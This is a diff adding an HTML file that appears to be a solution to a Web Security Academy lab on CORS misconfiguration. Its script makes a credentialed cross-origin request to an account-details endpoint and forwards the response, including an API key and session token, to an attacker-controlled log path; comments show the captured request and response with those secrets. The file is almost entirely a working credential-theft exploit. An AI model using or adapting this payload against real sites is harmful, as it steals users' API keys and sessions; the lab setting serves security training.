@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('get','https://0abc00ea0316938d8032303d007300e5.web-security-academy.net/accountDetails',true);
+        req.withCredentials = true;
+        req.send();
+    
+        function reqListener() {
+            location='/log?key='+this.responseText;
+        };
+    </script>
+</body>
+<!-- GET /accountDetails HTTP/2
+Host: 0ac8007d03e7939f805404a500ad0022.web-security-academy.net
+Cookie: session=89fLyN07O9d25IVuuJLhel55Cx5vvJ4s
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Origin: https://example.com
+Referer: https://0ac8007d03e7939f805404a500ad0022.web-security-academy.net/my-account?id=wiener
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers -->
+
+
+<!-- HTTP/2 200 OK
+Access-Control-Allow-Origin: https://example.com
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 149
+
+{
+  "username": "wiener",
+  "email": "",
+  "apikey": "AQNTvCaExBJOmDs2Lxf0B2zAuTEjVpHP",
+  "sessions": [
+    "89fLyN07O9d25IVuuJLhel55Cx5vvJ4s"
+  ]
+} -->
+</html>
+
+
+
+
